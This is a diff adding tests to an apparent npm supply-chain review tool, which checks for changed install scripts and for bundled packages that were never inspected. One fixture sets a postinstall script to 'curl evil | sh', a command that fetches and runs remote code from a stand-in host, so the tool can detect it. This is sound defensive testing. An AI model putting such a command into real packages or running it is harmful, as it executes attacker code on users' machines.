@@ -83,6 +83,38 @@ test("an install-script Thread isn't verified Fixed by a push whose tarball coul
   assert.equal(s.github.thread(thread.id).resolved, true);
 });
 
+test('an install script whose command changed is new, though its name is not', async () => {
+  const s = setup({ 'node_modules/cmd': pkg('cmd', '1.0.0') }, { 'node_modules/cmd': pkg('cmd', '1.0.1') });
+  s.registry.tarballs.set(url('cmd', '1.0.0'), packageTarball('cmd', '1.0.0', { postinstall: 'node build.js' }));
+  s.registry.tarballs.set(url('cmd', '1.0.1'), packageTarball('cmd', '1.0.1', { postinstall: 'curl evil | sh' }));
+  const review = await s.opened();
+
+  assert.equal(review.comments.length, 1);
+  assert.match(review.comments[0]!.body, /`postinstall`: `curl evil \| sh`/);
+});
+
+test("a bundled entry must be in its bundler's tarball at its folder and version, or it is not inspected", async () => {
+  const inner = (v: string) => ({ version: v, inBundle: true });
+  const s = setup(
+    { 'node_modules/host': pkg('host', '1.0.0'), 'node_modules/kept': pkg('kept', '1.0.0'), 'node_modules/sw': pkg('sw', '1.0.0') },
+    {
+      'node_modules/host': pkg('host', '1.1.0'), 'node_modules/host/node_modules/a': inner('1.0.0'),
+      'node_modules/host/node_modules/a/node_modules/deep': inner('2.0.0'), 'node_modules/host/node_modules/gone': inner('1.0.0'),
+      // A bundler that didn't move, now said to bundle a package it was never published with.
+      'node_modules/kept': pkg('kept', '1.0.0'), 'node_modules/kept/node_modules/sw': inner('1.0.1'),
+    },
+  );
+  s.registry.tarballs.set(url('host', '1.1.0'), packageTarball('host', '1.1.0', {}, {
+    'node_modules/a/package.json': JSON.stringify({ version: '1.0.0' }),
+    'node_modules/a/node_modules/deep/package.json': JSON.stringify({ version: '2.0.0' }),
+    'node_modules/gone/package.json': JSON.stringify({ version: '9.9.9' }),
+  }));
+  const review = await s.opened();
+
+  assert.match(review.body, /2 packages weren't inspected/);
+  assert.match(review.body, /Not inspected[^\n]*\n- `gone 1\.0\.0`\n- `sw 1\.0\.1`\n\n/);
+});
+
 test('past the fetch cap, the riskiest packages are fetched and the rest are listed as not inspected, blocking approval', async () => {
   const s = setup(
     { 'node_modules/minor': pkg('minor', '1.0.0'), 'node_modules/major': pkg('major', '1.0.0') },
